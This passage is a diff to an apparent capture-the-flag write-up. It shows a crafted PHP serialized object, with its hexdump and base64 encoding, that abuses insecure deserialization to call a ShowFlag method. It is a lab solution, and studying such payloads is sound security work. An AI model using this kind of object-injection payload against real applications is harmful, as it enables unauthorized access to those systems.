@@ -86,7 +86,7 @@ $obj->action = "ShowFlag";
 echo serialize($obj);
 {% endhighlight %}
 
-{% highlight bash %}
+{% highlight %}
 root@kali:~/Challenge41# php sploit.php 
 O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":3:{s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";s:6:"action";s:8:"ShowFlag";}}
 
@@ -99,8 +99,14 @@ root@kali:~/Challenge41# php sploit.php | hexdump -C
 00000050  3a 31 3a 22 31 22 3b 73  3a 34 3a 22 66 6c 61 67  |:1:"1";s:4:"flag|
 00000060  22 3b 73 3a 37 3a 22 50  6c 65 61 73 65 3f 22 3b  |";s:7:"Please?";|
 00000070  73 3a 36 3a 22 61 63 74  69 6f 6e 22 3b 73 3a 38  |s:6:"action";s:8|
-00000080  3a 22 53 68 6f 77 46 6c  61 67 22 3b 7d 7d 0a 0a  |:"ShowFlag";}}..|
-00000090
+00000080  3a 22 53 68 6f 77 46 6c  61 67 22 3b 7d 7d        |:"ShowFlag";}}|
+0000008e
+
+root@kali:~/Challenge41# php sploit.php | base64
+TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0
+ZENsYXNzIjozOntzOjQ6InRpbWUiO3M6MToiMSI7czo0OiJmbGFnIjtzOjc6IlBsZWFzZT8iO3M6
+NjoiYWN0aW9uIjtzOjg6IlNob3dGbGFnIjt9fQ==
+
 {% endhighlight %}
 
-
+Based on a review of the code, this object we have constructed should be suitable to reach the ShowFlag() method properly, considering that **(a)** $this->uStruct->time is not null, **(b)** $this->uStruct->flag is set to 'Please?', and **(c)** $obj->action is set to 'ShowFlag'. Sending this payload results in the flag being displayed on the page. 
